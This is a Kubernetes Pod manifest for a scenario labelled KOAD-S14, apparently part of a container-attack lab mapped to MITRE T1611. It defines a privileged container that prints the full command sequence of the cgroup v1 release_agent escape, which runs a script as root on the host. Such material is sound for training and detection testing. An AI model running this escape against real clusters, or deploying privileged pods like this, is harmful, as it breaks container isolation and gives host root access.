# KOAD-S14: Cgroup release_agent Escape
# ATT&CK: T1611 — Escape to Host
# Attack: Abuse cgroup release_agent to execute commands on host
---
apiVersion: v1
kind: Pod
metadata:
  name: escape-cgroup
  namespace: koad
  labels:
    koad-scenario: S14
    mitre-attck: T1611
    escape-method: cgroup-release-agent
spec:
  containers:
    - name: attacker
      image: ubuntu:22.04
      command: ["sh", "-c"]
      args:
        - |
          echo "=== KOAD-S14: Cgroup release_agent Escape ==="
          echo ""
          echo "Attack steps (cgroup v1):"
          echo "  1. mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp"
          echo "  2. mkdir /tmp/cgrp/x"
          echo "  3. echo 1 > /tmp/cgrp/x/notify_on_release"
          echo "  4. host_path=\$(sed -n 's/.*upperdir=\\([^,]*\\).*/\\1/p' /etc/mtab)"
          echo "  5. echo \"\$host_path/cmd\" > /tmp/cgrp/release_agent"
          echo "  6. echo '#!/bin/sh' > /cmd && echo 'id > /output' >> /cmd && chmod +x /cmd"
          echo "  7. echo \$\$ > /tmp/cgrp/x/cgroup.procs"
          echo "  8. cat /output  # Shows host root output"
          sleep infinity
      securityContext:
        privileged: true
